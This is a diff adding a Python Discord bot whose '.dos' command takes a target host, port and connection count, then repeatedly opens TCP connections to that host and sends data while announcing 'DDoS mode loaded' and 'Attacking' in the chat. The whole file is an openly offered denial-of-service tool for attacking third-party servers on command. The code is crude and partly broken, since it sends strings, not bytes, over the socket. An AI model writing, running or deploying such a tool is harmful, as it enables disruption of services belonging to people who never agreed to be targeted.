@@ -1,0 +1,47 @@
+import discord
+from discord.ext import commands
+
+import requests 
+import threading
+from threading import Thread
+import random
+
+bot = commands.Bot(command_prefix = ".", case_insensitive=True)
+
+import time, socket, os, sys, string
+import subprocess
+
+TOKEN = 'Your token'
+
+@bot.command()
+async def dos(ctx,host,port,conn3):
+  await ctx.send ("DDoS mode loaded")
+  host = host
+  port = int(port)
+  message = "+---------------------------+"
+  conn = f'{conn3}'
+  port2 = port
+  ip = socket.gethostbyname(host)
+  await ctx.send ("[" + ip + "]")
+  await ctx.send ("[Ip is locked]")
+  await ctx.send ("[Attacking " + host + "]")
+  await ctx.send(f'{message}')
+  def dos():
+    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        ddos.connect((host, port2))
+        ddos.send(message)
+        ddos.sendto(message, (ip, port2))
+        ddos.send(message)
+    except socket.error:
+        print ("|[Connection Failed] |")
+    print ("|[DDoS Attack Engaged] |")
+    ddos.close()
+  conner = int(conn3)
+  for i in range(1, conner):
+    dos()
+    await ctx.send(f'{message}')
+    await ctx.send(f'The connections you requested had finished')
+
+
+bot.run(TOKEN)
